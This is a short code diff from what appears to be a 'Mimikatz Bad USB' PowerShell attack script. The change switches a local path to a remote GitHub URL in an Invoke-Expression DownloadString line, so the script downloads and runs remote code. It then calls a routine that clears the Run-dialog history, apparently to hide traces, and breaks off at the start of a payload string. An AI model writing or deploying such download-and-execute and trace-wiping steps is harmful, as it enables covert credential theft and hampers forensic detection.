@@ -6,7 +6,7 @@ param (
 	################################################
 	)
 	
-	Invoke-Expression (New-Object Net.WebClient).DownloadString('C:\Dev\MrRobot\Hack 01 - Mimikatz Bad USB\Clean-RunMRU.psm1')
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H3LL0WORLD/Powershell/master/Utilities/Clean-RunMRU.psm1')
 	Clean-RunMRU -Last
 	
 	$Payload = "
